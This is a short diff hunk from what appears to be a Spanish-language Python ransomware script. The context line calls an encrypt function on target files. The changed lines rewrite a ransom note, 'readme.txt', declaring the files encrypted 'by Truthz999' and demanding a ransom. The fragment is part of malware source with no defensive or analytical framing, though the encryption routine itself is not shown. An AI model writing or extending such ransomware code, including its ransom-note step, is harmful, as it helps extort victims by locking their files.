@@ -41,6 +41,6 @@ encrypt(archivos_2, key)
 
 
 with open(archivos+"\\"+"readme.txt", "w") as file:
-    file.write("Archivos encryptados by Truthz999\n")
-    file.write("Se solicita rescate")
+    file.write("Archivos encryptados by Truthz999\n\n")
+    file.write("SE SOLICITA RESCATE")
 
